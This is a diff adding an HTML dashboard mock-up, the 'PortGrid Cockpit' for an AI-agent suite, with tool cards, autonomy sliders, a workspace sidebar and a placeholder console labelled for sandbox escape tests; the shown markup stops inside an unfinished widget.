@@ -1,0 +1,1480 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PortGrid Cockpit & Dashboard - NeuroSync Sovereign OS</title>
+
+    <!-- Cognitive Schema & Meta-mapping for AI Agents / Parsing Engines -->
+    <meta name="product-name" content="NeuroSync Sovereign OS">
+    <meta name="suite-name" content="Sovereign Suite">
+    <meta name="active-engine" content="PortGrid Skills & Tool Registry Cockpit">
+    <meta name="target-audience" content="Beginner Hobbyists & Freelancers">
+    <meta name="design-philosophy" content="Grit, Not Grime - zero-budget, high-reliability local execution">
+    <meta name="module-portgrid" content="Skills and capabilities hub managing human approval queues, local tool sandboxing, and verifiable confidence metrics.">
+    <meta name="module-coreexec" content="Asynchronous, durable task executor managing workflow state transitions and retries using SQLite WAL.">
+    <meta name="module-basevault" content="SQLite database management, schema migrations, and multi-level data sanitization/redaction pipelines.">
+    <meta name="module-routeswitch" content="Deterministic provider traffic routing engine, enforcing Free Mode Governor quotas.">
+
+    <!-- Specific Metatags Outlining Every Single Element Contained Within Dashboard -->
+    <meta name="dashboard-element-logo" content="Custom spring-green grid and wrench vector path denoting structured tool permissions containment.">
+    <meta name="dashboard-element-tools-registry" content="Registry grid showcasing active local capabilities with interactive authorization gates.">
+    <meta name="dashboard-element-sandbox-terminal" content="Interactive sandbox environment testing terminal simulating 40+ host escape exploits.">
+    <meta name="dashboard-element-deference-statusline" content="Visually quiet peripheral active execution stream designed to avoid operator cognitive fatigue.">
+    <meta name="dashboard-element-autonomy-dials" content="Dual slider dials configuring Budget/Rigour limits and Autonomy/Delegation sandboxing modes.">
+    <meta name="dashboard-element-local-badges" content="Qualitative trust indicators showing Local Only, Redacted, and Human Approved states.">
+    
+    <!-- Specific Metatags Outlining Every Single Element Contained Within Set-ups -->
+    <meta name="setups-config-threading-pool" content="Dynamic thread pooling allocation adjusting Node.js worker threads to match legacy hardware.">
+    <meta name="setups-config-redaction-policies" content="Automatic PII and API credential sanitization rules enforced at the Pino logging and BaseVault persistence layers.">
+    <meta name="setups-config-safety-assertions" content="Category A safety guardrails SA-01 to SA-06 preventing unauthorized file mutations or code self-execution.">
+
+    <!-- CSS / Icons Libraries -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    
+    <style>
+        /* CSS Variable System for Cyan-Teal-to-Mint Theme Morphing */
+        :root {
+            /* Dark Mode: Cyber-Teal & Deep Obsidian Space */
+            --bg-base: #020a07;
+            --bg-surface: #071914;
+            --bg-surface-glass: rgba(7, 25, 20, 0.75);
+            --bg-nested: rgba(0, 255, 204, 0.03);
+            --border-glow: rgba(0, 255, 204, 0.2);
+            --text-primary: #fafafa;
+            --text-muted: #86efac;
+            --accent: #00FFCC;
+            --accent-glow: rgba(0, 255, 204, 0.4);
+            --card-border: rgba(13, 148, 136, 0.4);
+            --grid-color: rgba(0, 255, 204, 0.03);
+            --grid-line: rgba(0, 255, 204, 0.015);
+            --glow-color: rgba(0, 255, 204, 0.15);
+            --logo-accent: #00FFCC;
+            --terminal-bg: #010806;
+            --terminal-text: #00FFCC;
+        }
+
+        .light {
+            /* Light Mode: Mint sky paper & rich forest green text - Highly textured & super readable */
+            --bg-base: #f0fdf4;
+            --bg-surface: #ffffff;
+            --bg-surface-glass: rgba(255, 255, 255, 0.85);
+            --bg-nested: rgba(13, 148, 136, 0.05);
+            --border-glow: rgba(13, 148, 136, 0.15);
+            --text-primary: #064e3b;
+            --text-muted: #0d9488;
+            --accent: #0d9488;
+            --accent-glow: rgba(13, 148, 136, 0.35);
+            --card-border: rgba(13, 148, 136, 0.2);
+            --grid-color: rgba(13, 148, 136, 0.05);
+            --grid-line: rgba(13, 148, 136, 0.02);
+            --glow-color: rgba(13, 148, 136, 0.08);
+            --logo-accent: #0d9488;
+            --terminal-bg: #09090b;
+            --terminal-text: #2dd4bf;
+        }
+
+        body {
+            background-color: var(--bg-base);
+            color: var(--text-primary);
+            font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-image: 
+                radial-gradient(circle at 50% 50%, var(--grid-color) 0%, transparent 60%),
+                linear-gradient(var(--grid-line) 1px, transparent 1px),
+                linear-gradient(90deg, var(--grid-line) 1px, transparent 1px);
+            background-size: 100% 100%, 20px 20px, 20px 20px;
+            transition: background-color 0.4s ease, color 0.4s ease, background-image 0.4s ease;
+        }
+
+        /* Technical Glow and Shadow Box Effects - Highly Interactive */
+        .glow-card {
+            border: 1px solid var(--card-border);
+            background-color: var(--bg-surface-glass);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15), 0 0 10px var(--glow-color);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .glow-card:hover {
+            border-color: var(--accent);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2), 0 0 18px var(--accent-glow);
+            transform: translateY(-2px);
+        }
+
+        /* Focus rings */
+        .focusable:focus-visible {
+            outline: 2px solid var(--accent);
+            outline-offset: 2px;
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--card-border);
+            border-radius: 3px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent);
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col overflow-x-hidden antialiased select-none">
+
+    <!-- TOP HEADER NAVIGATION BAR -->
+    <header class="w-full h-16 border-b border-[var(--card-border)] bg-[var(--bg-surface-glass)] backdrop-blur-md px-6 flex items-center justify-between z-40 fixed top-0 left-0 transition-colors duration-300">
+        <div class="flex items-center space-x-3">
+            <!-- Suite Switcher Hamburger on the far left -->
+            <button onclick="toggleSuiteSwitcher()" class="w-9 h-9 rounded-lg border border-[var(--card-border)] bg-[var(--bg-nested)] hover:opacity-80 flex items-center justify-center text-[var(--accent)] focusable" aria-label="Open Suite Switcher Menu">
+                <i data-lucide="menu" class="w-5 h-5"></i>
+            </button>
+
+            <!-- Custom PortGrid Spring Green Wrench Grid Logo -->
+            <div class="w-8 h-8 rounded-lg flex items-center justify-center">
+                <svg id="portgrid-logo" viewBox="0 0 100 100" class="w-8 h-8 transition-all duration-300 text-[var(--accent)]">
+                    <rect x="15" y="15" width="20" height="20" rx="4" fill="none" stroke="currentColor" stroke-width="2" opacity="0.4"/>
+                    <rect x="65" y="15" width="20" height="20" rx="4" fill="none" stroke="currentColor" stroke-width="2" opacity="0.4"/>
+                    <rect x="15" y="65" width="20" height="20" rx="4" fill="none" stroke="currentColor" stroke-width="2" opacity="0.4"/>
+                    <rect x="65" y="65" width="20" height="20" rx="4" fill="none" stroke="currentColor" stroke-width="2" opacity="0.4"/>
+                    <line x1="50" y1="10" x2="50" y2="90" stroke="currentColor" stroke-width="1" stroke-dasharray="2 4" opacity="0.5"/>
+                    <line x1="10" y1="50" x2="90" y2="50" stroke="currentColor" stroke-width="1" stroke-dasharray="2 4" opacity="0.5"/>
+                    <g transform="translate(50,50) scale(0.55) translate(-50,-50)">
+                        <g transform="rotate(45,50,50)">
+                            <path d="M 56 85 L 56 68 L 60 68 L 60 45 L 75 30 L 75 10 L 58 10 L 58 28 L 42 28 L 42 10 L 25 10 L 25 30 L 40 45 L 40 68 L 44 68 L 44 85 Z" fill="rgba(0,255,204,0.1)" stroke="currentColor" stroke-width="4" stroke-linejoin="round"/>
+                            <rect x="46" y="74" width="3" height="5" fill="#0D0E15"/>
+                            <rect x="51" y="74" width="3" height="5" fill="#0D0E15"/>
+                            <rect x="48" y="40" width="4" height="24" rx="2" fill="currentColor" />
+                        </g>
+                    </g>
+                </svg>
+            </div>
+            
+            <div class="hidden sm:block">
+                <span class="font-black text-sm tracking-wider uppercase bg-clip-text text-transparent bg-gradient-to-r from-[var(--text-primary)] via-[var(--accent)] to-[var(--text-primary)]">PORTGRID COCKPIT</span>
+                <span class="text-[9px] uppercase font-semibold text-[var(--text-muted)] tracking-widest block -mt-1">NeuroSync Sovereign Suite</span>
+            </div>
+        </div>
+
+        <!-- Dashboard / Set-ups Tab Selector -->
+        <div class="flex bg-[var(--bg-nested)] p-1 rounded-xl border border-[var(--card-border)] items-center space-x-1" role="tablist" aria-label="Core Navigation">
+            <button id="tab-dashboard" onclick="switchTab('dashboard')" class="px-5 py-1.5 rounded-lg text-sm font-semibold transition-all duration-200 flex items-center space-x-2 text-white bg-[var(--accent)] shadow shadow-[var(--accent-glow)] focusable" role="tab" aria-selected="true" aria-controls="panel-dashboard">
+                <i data-lucide="layout-dashboard" class="w-4 h-4 text-white dark:text-zinc-950"></i>
+                <span>Dashboard</span>
+            </button>
+            <button id="tab-setups" onclick="switchTab('setups')" class="px-5 py-1.5 rounded-lg text-sm font-semibold transition-all duration-200 flex items-center space-x-2 text-[var(--text-muted)] hover:text-[var(--text-primary)] focusable" role="tab" aria-selected="false" aria-controls="panel-setups">
+                <i data-lucide="sliders" class="w-4 h-4"></i>
+                <span>Set-ups</span>
+            </button>
+        </div>
+
+        <!-- Action Items (Menu Toggles, Theme Engine) -->
+        <div class="flex items-center space-x-2">
+            <!-- Theme Toggler -->
+            <button onclick="toggleTheme()" class="w-9 h-9 rounded-lg border border-[var(--card-border)] bg-[var(--bg-nested)] hover:opacity-85 flex items-center justify-center transition-all focusable" aria-label="Toggle visual theme">
+                <i id="theme-icon" data-lucide="sun" class="w-4 h-4 text-[var(--accent)]"></i>
+            </button>
+
+            <!-- Metadata Schema Audit Explorer Button -->
+            <button onclick="toggleMetaExplorer()" class="w-9 h-9 rounded-lg border border-[var(--card-border)] bg-[var(--bg-nested)] hover:opacity-85 flex items-center justify-center transition-all focusable" aria-label="Toggle system cognitive tags schema">
+                <i data-lucide="database" class="w-4 h-4 text-[var(--accent)]"></i>
+            </button>
+
+            <!-- Toggleable Right-hand Workspace Sidebar Button -->
+            <button onclick="toggleSidebar()" class="w-9 h-9 rounded-lg border border-[var(--card-border)] bg-[var(--bg-nested)] hover:opacity-85 flex items-center justify-center text-[var(--accent)] focusable" aria-label="Toggle command workspace panel">
+                <i data-lucide="sidebar" class="w-5 h-5"></i>
+            </button>
+        </div>
+    </header>
+
+    <!-- LEFT-HAND SUITE SWITCHER SIDEBAR (NAVIGATES THE 6 MODULES) -->
+    <aside id="suite-switcher" class="fixed left-0 top-16 h-[calc(100vh-4rem)] w-72 bg-[var(--bg-surface-glass)] backdrop-blur-md border-r border-[var(--card-border)] z-30 transition-transform duration-300 transform -translate-x-full shadow-2xl flex flex-col">
+        <div class="p-4 border-b border-[var(--card-border)] flex items-center justify-between">
+            <div class="flex items-center space-x-2 text-[var(--accent)]">
+                <i data-lucide="compass" class="w-4 h-4"></i>
+                <h3 class="font-bold text-xs tracking-wider uppercase">Sovereign Suite Switcher</h3>
+            </div>
+            <button onclick="toggleSuiteSwitcher()" class="p-1 rounded hover:bg-zinc-800/40 text-[var(--text-muted)] hover:text-[var(--text-primary)]" aria-label="Close suite navigation">
+                <i data-lucide="x" class="w-4 h-4"></i>
+            </button>
+        </div>
+
+        <!-- Suite Modules Directory list -->
+        <nav class="flex-1 p-4 space-y-2 overflow-y-auto font-medium">
+            <button onclick="triggerSuiteDemo('CoreExec')" class="w-full flex items-center p-3 rounded-xl hover:bg-[var(--bg-nested)] border border-transparent hover:border-[var(--card-border)] text-[var(--text-muted)] hover:text-[var(--text-primary)] transition text-left focusable">
+                <i data-lucide="cpu" class="w-4 h-4 mr-3"></i>
+                <span class="text-xs font-bold uppercase tracking-wider">CoreExec (Orchestrator)</span>
+            </button>
+
+            <button onclick="triggerSuiteDemo('BaseVault')" class="w-full flex items-center p-3 rounded-xl hover:bg-[var(--bg-nested)] border border-transparent hover:border-[var(--card-border)] text-[var(--text-muted)] hover:text-[var(--text-primary)] transition text-left focusable">
+                <i data-lucide="vault" class="w-4 h-4 mr-3"></i>
+                <span class="text-xs font-bold uppercase tracking-wider">BaseVault (Database)</span>
+            </button>
+
+            <a href="#" class="flex items-center justify-between p-3 rounded-xl bg-[var(--accent)]/10 border border-[var(--accent)] text-[var(--text-primary)] transition focusable">
+                <div class="flex items-center space-x-3">
+                    <i data-lucide="grid-3x3" class="w-4 h-4 text-[var(--accent)]"></i>
+                    <span class="text-xs font-bold uppercase tracking-wider">PortGrid (Skills Hub)</span>
+                </div>
+                <span class="w-2 h-2 rounded-full bg-[var(--accent)] animate-pulse"></span>
+            </a>
+
+            <button onclick="triggerSuiteDemo('RouteSwitch')" class="w-full flex items-center p-3 rounded-xl hover:bg-[var(--bg-nested)] border border-transparent hover:border-[var(--card-border)] text-[var(--text-muted)] hover:text-[var(--text-primary)] transition text-left focusable">
+                <i data-lucide="shuffle" class="w-4 h-4 mr-3"></i>
+                <span class="text-xs font-bold uppercase tracking-wider">RouteSwitch (Router)</span>
+            </button>
+
+            <button onclick="triggerSuiteDemo('ScopeLogic')" class="w-full flex items-center p-3 rounded-xl hover:bg-[var(--bg-nested)] border border-transparent hover:border-[var(--card-border)] text-[var(--text-muted)] hover:text-[var(--text-primary)] transition text-left focusable">
+                <i data-lucide="file-question" class="w-4 h-4 mr-3"></i>
+                <span class="text-xs font-bold uppercase tracking-wider">ScopeLogic (Proposal)</span>
+            </button>
+
+            <button onclick="triggerSuiteDemo('ScoutDaemon')" class="w-full flex items-center p-3 rounded-xl hover:bg-[var(--bg-nested)] border border-transparent hover:border-[var(--card-border)] text-[var(--text-muted)] hover:text-[var(--text-primary)] transition text-left focusable">
+                <i data-lucide="radar" class="w-4 h-4 mr-3"></i>
+                <span class="text-xs font-bold uppercase tracking-wider">ScoutDaemon (Predictive)</span>
+            </button>
+        </nav>
+
+        <div class="p-4 border-t border-[var(--card-border)] bg-zinc-900/20 text-[10px] text-zinc-500 flex flex-col space-y-1 font-mono">
+            <span>Sovereign Platform Framework</span>
+            <span>Design Core: Grit, Not Grime</span>
+        </div>
+    </aside>
+
+    <!-- RIGHT-HAND COLLAPSIBLE WORKSPACE PANELS SIDEBAR -->
+    <aside id="sidebar-panel" class="fixed right-0 top-16 h-[calc(100vh-4rem)] w-80 bg-[var(--bg-surface-glass)] backdrop-blur-md border-l border-[var(--card-border)] z-30 transition-transform duration-300 transform translate-x-0 shadow-2xl flex flex-col">
+        <!-- Sidebar Header -->
+        <div class="p-4 border-b border-[var(--card-border)] flex items-center justify-between">
+            <div class="flex items-center space-x-2 text-[var(--accent)]">
+                <i data-lucide="folder-search" class="w-4 h-4"></i>
+                <h3 class="font-bold text-sm tracking-wider uppercase">Project Target Workspace</h3>
+            </div>
+            <button onclick="toggleSidebar()" class="p-1 rounded hover:bg-zinc-800/40 text-[var(--text-muted)] hover:text-white" aria-label="Close panel">
+                <i data-lucide="x" class="w-4 h-4"></i>
+            </button>
+        </div>
+
+        <!-- Workspace Scrollable Settings -->
+        <div class="flex-1 overflow-y-auto p-4 space-y-5">
+            <!-- Project Workspace Selector -->
+            <div class="space-y-2">
+                <label class="text-xs font-semibold text-[var(--text-muted)] tracking-wider uppercase block">Project Database Workspace</label>
+                <div class="relative">
+                    <select id="project-selector" onchange="switchProject()" class="w-full bg-[var(--bg-surface)] border border-[var(--card-border)] rounded-lg px-3 py-2 text-sm text-[var(--text-primary)] focus:outline-none focus:border-[var(--accent)] appearance-none focusable">
+                        <option value="alex-workspace">Alex (Freelance Creator Silo)</option>
+                        <option value="sam-workspace">Sam (Hobbyist Developer Silo)</option>
+                        <option value="custom-workspace">Add New Custom Silo...</option>
+                    </select>
+                    <i data-lucide="chevron-down" class="w-4 h-4 text-[var(--accent)] absolute right-3 top-3 pointer-events-none"></i>
+                </div>
+            </div>
+
+            <!-- Database Persistence & Storage Snaps -->
+            <div class="bg-[var(--bg-nested)] border border-[var(--card-border)] rounded-lg p-3 space-y-3">
+                <div class="flex items-center justify-between">
+                    <span class="text-xs font-semibold text-[var(--accent)] uppercase tracking-wider flex items-center space-x-1">
+                        <i data-lucide="database-backup" class="w-3 h-3"></i>
+                        <span>SQLite WAL Persistence</span>
+                    </span>
+                    <span class="px-1.5 py-0.5 bg-green-500/10 text-green-400 rounded text-[9px] uppercase font-bold tracking-widest border border-green-500/20 animate-pulse">Synchronous</span>
+                </div>
+                <p class="text-[11px] text-[var(--text-muted)] leading-relaxed font-medium">
+                    State storage backed strictly by relational tables to prevent context window explosion.
+                </p>
+                <div class="grid grid-cols-2 gap-2 pt-1">
+                    <button onclick="triggerBackup()" class="bg-[var(--bg-surface)] hover:opacity-90 border border-[var(--card-border)] py-1.5 px-2 rounded-md text-[11px] font-bold hover:border-[var(--accent)]/50 flex items-center justify-center space-x-1.5 text-[var(--accent)] focusable">
+                        <i data-lucide="download" class="w-3 h-3"></i>
+                        <span>Backup DB</span>
+                    </button>
+                    <button onclick="triggerRestore()" class="bg-[var(--bg-surface)] hover:opacity-90 border border-[var(--card-border)] py-1.5 px-2 rounded-md text-[11px] font-bold hover:border-[var(--accent)]/50 flex items-center justify-center space-x-1.5 text-[var(--accent)] focusable">
+                        <i data-lucide="upload" class="w-3 h-3"></i>
+                        <span>Restore DB</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Activity Log Output Tracker (Pino formatted logs wrapper) -->
+            <div class="space-y-2">
+                <div class="flex items-center justify-between">
+                    <label class="text-xs font-semibold text-[var(--text-muted)] tracking-wider uppercase">PortGrid Activity Log</label>
+                    <button onclick="clearSovereignLogs()" class="text-[10px] text-[var(--accent)] hover:underline font-bold">Clear</button>
+                </div>
+                <div id="pino-logger" class="w-full h-44 bg-zinc-950 border border-[var(--card-border)] rounded-lg p-2 font-mono text-[9px] text-zinc-300 overflow-y-auto space-y-1">
+                    <div class="text-zinc-500 font-bold">INIT: PortGrid Registry active...</div>
+                    <div class="text-zinc-500 font-bold">INIT: P0 Sandboxing parameters validated...</div>
+                    <div class="text-[var(--accent)]">AUDIT: Scoped Workspace locked to project silo: alex-workspace</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Sidebar Footer Info -->
+        <div class="p-3 border-t border-[var(--card-border)] bg-zinc-900/40 text-[10px] text-zinc-500 font-mono text-center">
+            System ELO Rank: <span class="text-[var(--accent)] font-bold">3,533 edges</span> | v1.0-Beta
+        </div>
+    </aside>
+
+    <!-- MAIN DYNAMIC CONTENT CONTAINER -->
+    <div class="flex-1 flex pt-16 relative overflow-hidden">
+        <main class="flex-1 flex flex-col md:flex-row transition-all duration-300 p-6 space-y-6 md:space-y-0 md:space-x-6 min-h-[calc(100vh-4rem)] mr-0" id="main-content-layout">
+
+            <!-- TAB 1: OPERATOR COCKPIT DASHBOARD -->
+            <div id="panel-dashboard" class="flex-1 flex flex-col lg:flex-row space-y-6 lg:space-y-0 lg:space-x-6 w-full" role="tabpanel" aria-labelledby="tab-dashboard">
+                
+                <!-- LEFT CONTENT AREA: Capabilities Registry & Hardening Terminal -->
+                <div class="flex-1 bg-[var(--bg-surface-glass)] border border-[var(--card-border)] backdrop-blur-md rounded-2xl p-5 shadow-xl flex flex-col relative overflow-hidden transition-colors duration-300">
+                    <!-- Tech background subtle decoration grid -->
+                    <div class="absolute inset-0 bg-[radial-gradient(circle_at_top,_var(--grid-color)_0%,_transparent_75%)] pointer-events-none"></div>
+                    
+                    <div class="relative z-10 flex flex-col h-full space-y-6">
+                        <!-- Dashboard Header -->
+                        <div class="flex flex-col sm:flex-row sm:items-center justify-between border-b border-[var(--card-border)] pb-3 gap-3">
+                            <div>
+                                <h1 class="text-xl font-black tracking-wide">Skills &amp; Capabilities Registry</h1>
+                                <p class="text-xs text-[var(--text-muted)] mt-0.5 font-medium">Review sandboxed commands, manage local tool executions, and trigger proactive security validation loops.</p>
+                            </div>
+                            
+                            <!-- Trigger Sandbox Escape Checks -->
+                            <button onclick="runSandboxEscapeSuite()" id="run-escape-btn" class="px-5 py-2 rounded-xl bg-gradient-to-r from-[var(--accent)] via-teal-600 to-emerald-600 hover:opacity-95 text-white dark:text-zinc-950 dark:font-extrabold text-sm font-bold flex items-center justify-center space-x-2 transition-all shadow-lg shadow-[var(--accent-glow)] focusable">
+                                <i data-lucide="shield-alert" class="w-4 h-4 text-white dark:text-zinc-950"></i>
+                                <span>Run 40+ Sandbox Escape Tests</span>
+                            </button>
+                        </div>
+
+                        <!-- Top Part: Visual Bounded Tools Marketplace -->
+                        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                            <!-- Tool Card 1: run_command -->
+                            <div class="glow-card rounded-2xl p-4 flex flex-col justify-between">
+                                <div class="space-y-2">
+                                    <div class="flex items-center justify-between">
+                                        <div class="flex items-center space-x-2 text-[var(--accent)]">
+                                            <i data-lucide="terminal" class="w-4 h-4"></i>
+                                            <span class="text-xs font-black uppercase tracking-wider">run_command</span>
+                                        </div>
+                                        <span class="px-2 py-0.5 bg-green-500/10 text-green-400 border border-green-500/20 text-[8px] font-bold rounded uppercase font-mono tracking-wider">ACTIVE</span>
+                                    </div>
+                                    <p class="text-[11px] text-[var(--text-muted)] leading-relaxed">Runs host terminal commands. Restricted to a strict allowlist of 20 read-only commands (ls, cat, grep, find, wc, etc.).</p>
+                                </div>
+                                <div class="mt-4 pt-3 border-t border-[var(--card-border)] flex items-center justify-between">
+                                    <span class="px-1.5 py-0.5 bg-[var(--accent)]/10 text-[var(--accent)] text-[8px] rounded uppercase font-bold tracking-widest border border-[var(--accent)]/20">Local Only</span>
+                                    <label class="relative inline-flex items-center cursor-pointer">
+                                        <input type="checkbox" checked class="sr-only peer" onchange="toggleTool('run_command', this.checked)">
+                                        <div class="w-8 h-4 bg-zinc-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-zinc-300 after:border after:rounded-full after:h-3 after:w-3 after:transition-all peer-checked:bg-[var(--accent)]"></div>
+                                    </label>
+                                </div>
+                            </div>
+
+                            <!-- Tool Card 2: git_nexus -->
+                            <div class="glow-card rounded-2xl p-4 flex flex-col justify-between">
+                                <div class="space-y-2">
+                                    <div class="flex items-center justify-between">
+                                        <div class="flex items-center space-x-2 text-[var(--accent)]">
+                                            <i data-lucide="git-branch" class="w-4 h-4"></i>
+                                            <span class="text-xs font-black uppercase tracking-wider">git_nexus</span>
+                                        </div>
+                                        <span class="px-2 py-0.5 bg-green-500/10 text-green-400 border border-green-500/20 text-[8px] font-bold rounded uppercase font-mono tracking-wider">ACTIVE</span>
+                                    </div>
+                                    <p class="text-[11px] text-[var(--text-muted)] leading-relaxed">Asynchronously parses AST trees from target repositories without event-loop starvation, yielding structure snapshots.</p>
+                                </div>
+                                <div class="mt-4 pt-3 border-t border-[var(--card-border)] flex items-center justify-between">
+                                    <span class="px-1.5 py-0.5 bg-[var(--accent)]/10 text-[var(--accent)] text-[8px] rounded uppercase font-bold tracking-widest border border-var(--accent)/20">Redacted before send</span>
+                                    <label class="relative inline-flex items-center cursor-pointer">
+                                        <input type="checkbox" checked class="sr-only peer" onchange="toggleTool('git_nexus', this.checked)">
+                                        <div class="w-8 h-4 bg-zinc-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-zinc-300 after:border after:rounded-full after:h-3 after:w-3 after:transition-all peer-checked:bg-[var(--accent)]"></div>
+                                    </label>
+                                </div>
+                            </div>
+
+                            <!-- Tool Card 3: sqlite_vec -->
+                            <div class="glow-card rounded-2xl p-4 flex flex-col justify-between">
+                                <div class="space-y-2">
+                                    <div class="flex items-center justify-between">
+                                        <div class="flex items-center space-x-2 text-[var(--accent)]">
+                                            <i data-lucide="database" class="w-4 h-4"></i>
+                                            <span class="text-xs font-black uppercase tracking-wider">sqlite_vec</span>
+                                        </div>
+                                        <span class="px-2 py-0.5 bg-yellow-500/10 text-yellow-500 border border-yellow-500/20 text-[8px] font-bold rounded uppercase font-mono tracking-wider">OFF-PEAK</span>
+                                    </div>
+                                    <p class="text-[11px] text-[var(--text-muted)] leading-relaxed">Computes local vector cosine similarity searches, offloaded to worker threads to prevent main event loop starvation.</p>
+                                </div>
+                                <div class="mt-4 pt-3 border-t border-[var(--card-border)] flex items-center justify-between">
+                                    <span class="px-1.5 py-0.5 bg-[var(--accent)]/10 text-[var(--accent)] text-[8px] rounded uppercase font-bold tracking-widest border border-var(--accent)/20">Worker thread bound</span>
+                                    <label class="relative inline-flex inline-flex items-center cursor-pointer">
+                                        <input type="checkbox" class="sr-only peer" onchange="toggleTool('sqlite_vec', this.checked)">
+                                        <div class="w-8 h-4 bg-zinc-700 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-zinc-300 after:border after:rounded-full after:h-3 after:w-3 after:transition-all peer-checked:bg-[var(--accent)]"></div>
+                                    </label>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Sandbox Escape Audits Terminal Console -->
+                        <div class="border border-[var(--card-border)] bg-[var(--terminal-bg)] rounded-2xl p-5 relative overflow-hidden flex flex-col space-y-3 h-52">
+                            <div class="flex items-center justify-between border-b border-[var(--card-border)] pb-2">
+                                <span class="text-[10px] font-black uppercase tracking-widest text-[var(--terminal-text)] font-mono">P0 Container Hardening Sandbox Test Audit Trail</span>
+                                <span id="audit-indicator" class="text-[9px] font-mono font-bold text-zinc-500">STANDBY - WAITING TRIGGER</span>
+                            </div>
+                            
+                            <!-- Test outputs log lines -->
+                            <div id="sandbox-logs-area" class="flex-1 overflow-y-auto font-mono text-[10px] text-zinc-300 space-y-1.5 pr-2 select-text">
+                                <div class="text-zinc-500">Awaiting Sandbox Diagnostic Suite... click button to evaluate local security invariants against malicious command exfiltrations.</div>
+                            </div>
+
+                            <!-- Progress Bar -->
+                            <div id="sandbox-progress-bar-container" class="w-full h-1.5 bg-zinc-800 rounded-full overflow-hidden hidden">
+                                <div id="sandbox-progress-bar" class="h-full bg-gradient-to-r from-[var(--accent)] to-teal-500 transition-all duration-100" style="width: 0%"></div>
+                            </div>
+                        </div>
+
+                        <!-- Visually Quiet Active Workflow Statusline (Deference UI) -->
+                        <div class="border border-[var(--card-border)] bg-[var(--bg-nested)] p-4 rounded-xl flex items-center justify-between shadow-sm relative overflow-hidden">
+                            <div class="flex items-center space-x-3">
+                                <span id="statusline-pulse" class="w-2.5 h-2.5 rounded-full bg-[var(--accent)] animate-pulse shadow shadow-[var(--accent-glow)]"></span>
+                                <div>
+                                    <span class="text-xs font-black uppercase tracking-wider block text-[var(--text-primary)]">Deference Statusline</span>
+                                    <p id="statusline-msg" class="text-[10px] text-[var(--text-muted)] font-medium">All background tasks executing quietly. Click 'Decision Node Audit' to inspect intent tree.</p>
+                                </div>
+                            </div>
+                            
+                            <!-- Action override for intent trees (Deference UI paradigm) -->
+                            <button onclick="toggleIntentTree()" class="px-4 py-1.5 rounded-lg border border-[var(--card-border)] bg-[var(--bg-surface)] hover:opacity-90 text-[var(--accent)] text-xs font-bold transition focusable">
+                                Decision Node Audit
+                            </button>
+                        </div>
+
+                    </div>
+                </div>
+
+                <!-- RIGHT CONTENT AREA: Glowing Shadow Modular Widgets -->
+                <div class="w-full lg:w-96 flex flex-col space-y-6">
+                    
+                    <!-- WIDGET 1: Autonomy & Delegation Dials -->
+                    <div class="glow-card rounded-2xl p-5 relative overflow-hidden transition-colors duration-300" role="region" aria-label="Autonomy Dials">
+                        <div class="flex items-center justify-between border-b border-[var(--card-border)] pb-3 mb-4">
+                            <div class="flex items-center space-x-2 text-[var(--accent)]">
+                                <i data-lucide="gauge" class="w-4 h-4"></i>
+                                <h3 class="font-bold text-xs tracking-wider uppercase">Autonomy Dials</h3>
+                            </div>
+                            <span class="px-1.5 py-0.5 bg-[var(--accent)]/10 text-[var(--accent)] rounded text-[9px] uppercase font-bold tracking-widest border border-[var(--accent)]/20">Sovereign Limits</span>
+                        </div>
+
+                        <div class="space-y-5">
+                            <!-- Dial 1: Budget & Rigour -->
+                            <div class="space-y-1.5">
+                                <div class="flex justify-between text-xs font-black">
+                                    <span>Budget &amp; Rigour Dial</span>
+                                    <span id="dial-budget-label" class="text-[var(--accent)] uppercase font-mono text-[10px]">Low Quota</span>
+                                </div>
+                                <input type="range" id="dial-budget" min="1" max="3" value="1" oninput="updateBudgetDial(this.value)" class="w-full h-1.5 bg-[var(--card-border)] rounded-lg appearance-none cursor-pointer accent-[var(--accent)]">
+                                <p class="text-[10px] text-[var(--text-muted)] leading-relaxed">Limits loop iterations and contexts to conserve daily API tokens.</p>
+                            </div>
+
+                            <!-- Dial 2: Autonomy & Delegation -->
+                            <div class="space-y-1.5 border-t border-[var(--card-border)] pt-4">
+                                <div class="flex justify-between text-xs font-black">
+                                    <span>Autonomy &amp; Delegation</span>
+                                    <span id="dial-autonomy-label" class="text-[var(--accent)] uppercase font-mono text-[10px]">Strict Previews</span>
+                                </div>
+                                <input type="range" id="dial-autonomy" min="1" max="3" value="1" oninput="updateAutonomyDial(this.value)" class="w-full h-1.5 bg-[var(--card-border)] rounded-lg appearance-none cursor-pointer accent-[var(--accent)]">
+                                <p class="text-[10px] text-[var(--text-muted)] leading-relaxed">Controls if code is stripped of execution permissions before human approval.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- WIDGET 2: Free Mode Governor Quota Grid -->
+                    <div class="glow-card rounded-2xl p-5 relative overflow-hidden transition-colors duration-300" role="region" aria-label="Free Mode Governor">
